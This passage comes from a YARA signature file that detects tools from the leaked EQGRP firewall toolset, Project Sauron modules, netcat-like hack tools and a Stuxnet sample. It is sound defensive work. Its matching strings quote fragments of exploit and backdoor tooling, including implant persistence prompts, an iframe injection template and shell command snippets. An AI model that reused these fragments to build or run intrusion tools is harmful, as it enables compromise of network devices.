      hash1 = "ee266f84a1a4ccf2e789a73b0a11242223ed6eba6868875b5922aea931a2199c"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "cd /current/bin/FW/BANANAGLEE/$bgver/Install/LP/jetplow" fullword ascii
      $s2 = "***** Please place your UA in /current/bin/FW/OPS *****" fullword ascii
      $s3 = "ln -s ../jp/orig_code.bin orig_code_pixGen.bin" fullword ascii
      $s4 = "*****             Welcome to JetPlow              *****" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_extrabacon_RID2E5A : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file extrabacon_1.1.0.1.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:10:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "59d60835fe200515ece36a6e87e642ee8059a40cb04ba5f4b9cce7374a3e7735"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "To disable password checking on target:" fullword ascii
      $x2 = "[-] target is running" fullword ascii
      $x3 = "[-] problem importing version-specific shellcode from" fullword ascii
      $x4 = "[+] importing version-specific shellcode" fullword ascii
      $s5 = "[-] unsupported target version, abort" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_sploit_py_RID2E16 : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file sploit.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "the --spoof option requires 3 or 4 fields as follows redir_ip" ascii
      $x2 = "[-] timeout waiting for response - target may have crashed" fullword ascii
      $x3 = "[-] no response from health check - target may have crashed" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_create_http_injection_RID32E8 : APT DEMO FILE SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file create_http_injection.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 14:25:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "de52f5621b4f3896d4bd1fb93ee8be827e71a2b189a9f8552b68baed062a992d"
      tags = "APT, DEMO, FILE, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "required by SECONDDATE" fullword ascii
      $s1 = "help='Output file name (optional). By default the resulting data is written to stdout.')" fullword ascii
      $s2 = "data = '<html><body onload=\"location.reload(true)\"><iframe src=\"%s\" height=\"1\" width=\"1\" scrolling=\"no\" frameborder=\"" ascii
      $s3 = "version='%prog 1.0'," fullword ascii
      $s4 = "usage='%prog [ ... options ... ] url'," fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 3KB and ( $x1 or 2 of them ) ) or ( all of them )
}

rule APT_EQGRP_BpfCreator_RHEL4_RID2FD9 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - file BpfCreator-RHEL4"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "bd7303393409623cabf0fcf2127a0b81fae52fe40a0d2b8db0f9f092902bbd92"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "usage %s \"<tcpdump pcap string>\" <outfile>" fullword ascii
      $s2 = "error reading dump file: %s" fullword ascii
      $s3 = "truncated dump file; tried to read %u captured bytes, only got %lu" fullword ascii
      $s4 = "%s: link-layer type %d isn't supported in savefiles" fullword ascii
      $s5 = "DLT %d is not one of the DLTs supported by this device" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and all of them )
}

rule APT_EQGRP_StoreFc_RID2CE9 : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file StoreFc.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f155cce4eecff8598243a721389046ae2b6ca8ba6cb7b4ac00fd724601a56108"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Usage: StoreFc.py --configFile=<path to xml file> --implantFile=<path to BinStore implant> [--outputFile=<file to write the conf" ascii
      $x2 = "raise Exception, \"Must supply both a config file and implant file.\"" fullword ascii
      $x3 = "This is wrapper for Store.py that FELONYCROWBAR will use. This" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_hexdump_RID2D2E : APT DEMO FILE SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file hexdump.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:20:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "95a9a6a8de60d3215c1c9f82d2d8b2640b42f5cabdc8b50bd1f4be2ea9d7575a"
      tags = "APT, DEMO, FILE, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "def hexdump(x,lead=\"[+] \",out=sys.stdout):" fullword ascii
      $s2 = "print >>out, \"%s%04x  \" % (lead,i)," fullword ascii
      $s3 = "print >>out, \"%02X\" % ord(x[i+j])," fullword ascii
      $s4 = "print >>out, sane(x[i:i+16])" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 1KB and 2 of ( $s* ) ) or ( all of them )
}

rule APT_EQGRP_BARPUNCH_BPICKER_RID2EE5 : APT DEMO FILE T1083 {
   meta:
      description = "EQGRP Toolset Firewall - from files BARPUNCH-3110, BPICKER-3100"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
      hash2 = "d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f"
      tags = "APT, DEMO, FILE, T1083"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s --lptimeout %u" fullword ascii
      $x2 = "%s -c <cmdtype> -l <lp> -i <implant> -k <ikey> -s <port> -d <port> [operation] [options]" fullword ascii
      $x3 = "* [%lu] 0x%x is marked as stateless (the module will be persisted without its configuration)" fullword ascii
      $x4 = "%s version %s already has persistence installed. If you want to uninstall," fullword ascii
      $x5 = "The active module(s) on the target are not meant to be persisted" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 1 of them ) or ( 3 of them )
}

rule APT_EQGRP_Implants_Gen6_RID2F2A : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
      hash2 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash3 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "LP.c:pixSecurity - Improper number of bytes read in Security/Interface Information" fullword ascii
      $s2 = "LP.c:pixSecurity - Not in Session" fullword ascii
      $s3 = "getModInterface__preloadedModules" fullword ascii
      $s4 = "showCommands" fullword ascii
      $s5 = "readModuleInterface" fullword ascii
      $s6 = "Wrapping_Not_Necessary_Or_Wrapping_Ok" fullword ascii
      $s7 = "Get_CMD_List" fullword ascii
      $s8 = "LP_Listen2" fullword ascii
      $s9 = "killCmdList" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and all of them )
}

rule APT_EQGRP_Implants_Gen5_RID2F29 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
      hash2 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
      hash3 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Module and Implant versions do not match.  This module is not compatible with the target implant" fullword ascii
      $s1 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.log" fullword ascii
      $s2 = "%s/BF_%04d%02d%02d.log" fullword ascii
      $s3 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.bin" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and 1 of ( $x* ) ) or ( all of them )
}

rule APT_EQGRP_BananaUsurper_writeJetPlow_RID34B9 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 15:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
      hash2 = "464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Implant Version-Specific Values:" fullword ascii
      $x2 = "This function should not be used with a Netscreen, something has gone horribly wrong" fullword ascii
      $s1 = "createSendRecv: recv'd an error from the target." fullword ascii
      $s2 = "Error: WatchDogTimeout read returned %d instead of 4" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of ( $x* ) ) or ( 3 of them )
}

rule APT_EQGRP_Implants_Gen4_RID2F28 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash2 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      hash3 = "8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Command has not yet been coded" fullword ascii
      $s2 = "Beacon Domain  : www.%s.com" fullword ascii
      $s3 = "This command can only be run on a PIX/ASA" fullword ascii
      $s4 = "Warning! Bad or missing Flash values (in section 2 of .dat file)" fullword ascii
      $s5 = "Printing the interface info and security levels. PIX ONLY." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 3 of them ) or ( all of them )
}

rule APT_EQGRP_Implants_Gen3_RID2F27 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
      hash2 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash3 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "incomplete and must be removed manually.)" fullword ascii
      $s1 = "%s: recv'd an error from the target." fullword ascii
      $s2 = "Unable to fetch the address to the get_uptime_secs function for this OS version" fullword ascii
      $s3 = "upload/activate/de-activate/remove/cmd function failed" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 2 of them ) or ( all of them )
}

rule APT_EQGRP_BLIAR_BLIQUER_RID2E10 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:58:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash2 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Do you wish to activate the implant that is already on the firewall? (y/n): " fullword ascii
      $x2 = "There is no implant present on the firewall." fullword ascii
      $x3 = "Implant Version :%lx%lx%lx" fullword ascii
      $x4 = "You may now connect to the implant using the pbd idkey" fullword ascii
      $x5 = "No reply from persistant back door." fullword ascii
      $x6 = "rm -rf pbd.wc; wc -c %s > pbd.wc" fullword ascii
      $p1 = "PBD_GetVersion" fullword ascii
      $p2 = "pbd/pbdEncrypt.bin" fullword ascii
      $p3 = "pbd/pbdGetVersion.pkt" fullword ascii
      $p4 = "pbd/pbdStartWrite.bin" fullword ascii
      $p5 = "pbd/pbd_setNewHookPt.pkt" fullword ascii
      $p6 = "pbd/pbd_Upload_SinglePkt.pkt" fullword ascii
      $s1 = "Unable to fetch hook and jmp addresses for this OS version" fullword ascii
      $s2 = "Could not get hook and jump addresses" fullword ascii
      $s3 = "Enter the name of a clean implant binary (NOT an image):" fullword ascii
      $s4 = "Unable to read dat file for OS version 0x%08lx" fullword ascii
      $s5 = "Invalid implant file" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and ( 1 of ( $x* ) or 1 of ( $p* ) ) ) or ( 3 of them )
}

rule APT_EQGRP_sploit_RID2CCE : APT DEMO FILE SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - from files sploit.py, sploit.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6"
      tags = "APT, DEMO, FILE, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "print \"[+] Connecting to %s:%s\" % (self.params.dst['ip'], self.params.dst['port'])" fullword ascii
      $s2 = "@overridable(\"Must be overriden if the target will be touched.  Base implementation should not be called.\")" fullword ascii
      $s3 = "@overridable(\"Must be overriden.  Base implementation should not be called.\")" fullword ascii
      $s4 = "exp.load_vinfo()" fullword ascii
      $s5 = "if not okay and self.terminateFlingOnException:" fullword ascii
      $s6 = "print \"[-] keyboard interrupt before response received\"" fullword ascii
      $s7 = "if self.terminateFlingOnException:" fullword ascii
      $s8 = "print 'Debug info ','='*40" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 90KB and 1 of ( $s* ) ) or ( 4 of them )
}

rule APT_EQGRP_Implants_Gen2_RID2F26 : APT DEMO FILE T1083 {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
      hash2 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
      hash3 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
      tags = "APT, DEMO, FILE, T1083"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Modules persistence file written successfully" fullword ascii
      $x2 = "Modules persistence data successfully removed" fullword ascii
      $x3 = "No Modules are active on the firewall, nothing to persist" fullword ascii
      $s1 = "--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s " fullword ascii
      $s2 = "Error while attemping to persist modules:" fullword ascii
      $s3 = "Error while reading interface info from PIX" fullword ascii
      $s4 = "LP.c:pixFree - Failed to get response" fullword ascii
      $s5 = "WARNING: LP Timeout specified (%lu seconds) less than default (%u seconds).  Setting default" fullword ascii
      $s6 = "Unable to fetch config address for this OS version" fullword ascii
      $s7 = "LP.c: interface information not available for this session" fullword ascii
      $s8 = "[%s:%s:%d] ERROR: " fullword ascii
      $s9 = "extract_fgbg" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 1 of ( $x* ) ) or ( 5 of them )
}

rule APT_EQGRP_eligiblebombshell_generic_RID3464 : APT DEMO GEN SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - from files eligiblebombshell_1.2.0.1.py, eligiblebombshell_1.2.0.1.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 15:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dd0e3ae6e1039a755bf6cb28bf726b4d6ab4a1da2392ba66d114a43a55491eb1"
      tags = "APT, DEMO, GEN, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "logging.error(\"       Perhaps you should run with --scan?\")" fullword ascii
      $s2 = "logging.error(\"ERROR: No entry for ETag [%s] in %s.\" %" fullword ascii
      $s3 = "\"be supplied\")" fullword ascii
   condition: 
      ( filesize < 70KB and 2 of ( $s* ) ) or ( all of them )
}

rule APT_EQGRP_ssh_telnet_29_RID2F36 : APT DEMO SCRIPT T1021_004 {
   meta:
      description = "EQGRP Toolset Firewall - from files ssh.py, telnet.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "630d464b1d08c4dfd0bd50552bee2d6a591fb0b5597ecebaa556a3c3d4e0aa4e"
      hash2 = "07f4c60505f4d5fb5c4a76a8c899d9b63291444a3980d94c06e1d5889ae85482"
      tags = "APT, DEMO, SCRIPT, T1021_004"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "received prompt, we're in" fullword ascii
      $s2 = "failed to login, bad creds, abort" fullword ascii
      $s3 = "sending command \" + str(n) + \"/\" + str(tot) + \", len \" + str(len(chunk) + " fullword ascii
      $s4 = "received nat - EPBA: ok, payload: mangled, did not run" fullword ascii
      $s5 = "no status returned from target, could be an exploit failure, or this is a version where we don't expect a stus return" ascii
      $s6 = "received arp - EPBA: ok, payload: fail" fullword ascii
      $s7 = "chopped = string.rstrip(payload, \"\\x0a\")" fullword ascii
   condition: 
      ( filesize < 10KB and 2 of them ) or ( 3 of them )
}

rule APT_EQGRP_noclient_3_0_5_RID2F44 : APT DEMO FILE {
   meta:
      description = "Detects tool from EQGRP toolset - file noclient-3.0.5.3"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "-C %s 127.0.0.1\" scripme -F -t JACKPOPIN4 '&" fullword ascii
      $x2 = "Command too long!  What the HELL are you trying to do to me?!?!  Try one smaller than %d bozo." fullword ascii
      $x3 = "sh -c \"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \"" fullword ascii
      $x4 = "Error from ourtn, did not find keys=target in tn.spayed" fullword ascii
      $x5 = "ourtn -d -D %s -W 127.0.0.1:%d  -i %s -p %d %s %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and 1 of them ) or ( all of them )
}

rule APT_EQGRP_installdate_RID2EC8 : APT DEMO {
   meta:
      description = "Detects tool from EQGRP toolset - file installdate.pl"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 11:29:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "#Provide hex or EP log as command-line argument or as input" fullword ascii
      $x2 = "print \"Gimme hex: \";" fullword ascii
      $x3 = "if ($line =~ /Reg_Dword:  (\\d\\d:\\d\\d:\\d\\d.\\d+ \\d+ - )?(\\S*)/) {" fullword ascii
      $s1 = "if ($_ =~ /InstallDate/) {" fullword ascii
      $s2 = "if (not($cmdInput)) {" fullword ascii
      $s3 = "print \"$hex in decimal=$dec\\n\\n\";" fullword ascii
   condition: 
      filesize < 2KB and ( 1 of ( $x* ) or 3 of them )
}

rule APT_EQGRP_durablenapkin_solaris_2_0_1_RID349F : APT DEMO FILE {
   meta:
      description = "Detects tool from EQGRP toolset - file durablenapkin.solaris.2.0.1.1"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 15:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "recv_ack: %s: Service not supplied by provider" fullword ascii
      $s2 = "send_request: putmsg \"%s\": %s" fullword ascii
      $s3 = "port undefined" fullword ascii
      $s4 = "recv_ack: %s getmsg: %s" fullword ascii
      $s5 = ">> %d -- %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 2 of them )
}

rule APT_EQGRP_dn_1_0_2_1_RID2D45 : APT DEMO FILE LINUX {
   meta:
      description = "Detects tool from EQGRP toolset - file dn.1.0.2.1.linux"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 10:24:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Valid commands are: SMAC, DMAC, INT, PACK, DONE, GO" fullword ascii
      $s2 = "invalid format suggest DMAC=00:00:00:00:00:00" fullword ascii
      $s3 = "SMAC=%02x:%02x:%02x:%02x:%02x:%02x" fullword ascii
      $s4 = "Not everything is set yet" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 2 of them )
}

rule APT_EQGRP_bc_parser_RID2DE4 : APT DEMO FILE {
   meta:
      description = "Detects tool from EQGRP toolset - file bc-parser"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 10:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "879f2f1ae5d18a3a5310aeeafec22484607649644e5ecb7d8a72f0877ac19cee"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "*** Target may be susceptible to FALSEMOREL      ***" fullword ascii
      $s2 = "*** Target is susceptible to FALSEMOREL          ***" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and 1 of them
}

rule APT_EQGRP_1212_RID2AF9 : APT DEMO {
   meta:
      description = "Detects tool from EQGRP toolset - file 1212.pl"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 08:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if (!(($srcip,$dstip,$srcport,$dstport) = ($line=~/^([a-f0-9]{8})([a-f0-9]{8})([a-f0-9]{4})([a-f0-9]{4})$/)))" fullword ascii
      $s2 = "$ans=\"$srcip:$srcport -> $dstip:$dstport\";" fullword ascii
      $s3 = "return \"ERROR:$line is not a valid port\";" fullword ascii
      $s4 = "$dstport=hextoPort($dstport);" fullword ascii
      $s5 = "sub hextoPort" fullword ascii
      $s6 = "$byte_table{\"$chars[$sixteens]$chars[$ones]\"}=$i;" fullword ascii
   condition: 
      filesize < 6KB and 4 of them
}

rule APT_EQGRP_1212_dehex_RID2D66 : APT DEMO FILE {
   meta:
      description = "Detects tool from EQGRP toolset - from files 1212.pl, dehex.pl"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 10:30:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "return \"ERROR:$line is not a valid address\";" fullword ascii
      $s2 = "print \"ERROR: the filename or hex representation needs to be one argument try using \\\"'s\\n\";" fullword ascii
      $s3 = "push(@octets,$byte_table{$tempi});" fullword ascii
      $s4 = "$byte_table{\"$chars[$sixteens]$chars[$ones]\"}=$i;" fullword ascii
      $s5 = "print hextoIP($ARGV[0]);" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 6KB and ( 5 of ( $s* ) ) ) or ( all of them )
}

rule APT_Project_Sauron_arping_module_RID33C8 : APT DEMO G0041 {
   meta:
      description = "Detects strings from arping module - Project Sauron report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/faq-the-projectsauron-apt/75533/"
      date = "2016-08-08 15:02:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "APT, DEMO, G0041"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Resolve hosts that answer" 
      $s2 = "Print only replying Ips" 
      $s3 = "Do not display MAC addresses" 
   condition: 
      all of them
}

rule APT_Project_Sauron_kblogi_module_RID33BF : APT DEMO G0041 {
   meta:
      description = "Detects strings from kblogi module - Project Sauron report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/faq-the-projectsauron-apt/75533/"
      date = "2016-08-08 15:01:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "APT, DEMO, G0041"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Inject using process name or pid. Default" 
      $s2 = "Convert mode: Read log from file and convert to text" 
      $s3 = "Maximum running time in seconds" 
   condition: 
      $x1 or 2 of them
}

rule APT_Project_Sauron_basex_module_RID335A : APT DEMO G0041 {
   meta:
      description = "Detects strings from basex module - Project Sauron report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/faq-the-projectsauron-apt/75533/"
      date = "2016-08-08 14:44:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "APT, DEMO, G0041"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "64, 64url, 32, 32url or 16." 
      $s2 = "Force decoding when input is invalid/corrupt" 
      $s3 = "This cruft" 
   condition: 
      $x1 or 2 of them
}

rule APT_Project_Sauron_dext_module_RID32FC : APT DEMO G0041 {
   meta:
      description = "Detects strings from dext module - Project Sauron report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/faq-the-projectsauron-apt/75533/"
      date = "2016-08-08 14:28:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "APT, DEMO, G0041"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Assemble rows of DNS names back to a single string of data" 
      $x2 = "removes checks of DNS names and lengths (during split)" 
      $x3 = "Randomize data lengths (length/2 to length)" 
      $x4 = "This cruft" 
   condition: 
      2 of them
}

rule Hacktool_This_Cruft_RID2EA0 : APT DEMO EXE FILE G0041 {
   meta:
      description = "Detects string 'This cruft' often used in hack tools like netcat or cryptcat and also mentioned in Project Sauron report"
      author = "Florian Roth"
      reference = "https://securelist.com/faq-the-projectsauron-apt/75533/"
      date = "2016-08-08 11:22:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "APT, DEMO, EXE, FILE, G0041"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "This cruft" fullword
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and $x1 )
}

rule APT_Stuxnet_Shortcut_to_RID304D : APT DEMO FILE T1210 T1547_009 stuxnet {
   meta:
      description = "Stuxnet Sample - file Copy of Shortcut to.lnk"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-09 12:34:01"
      score = 75
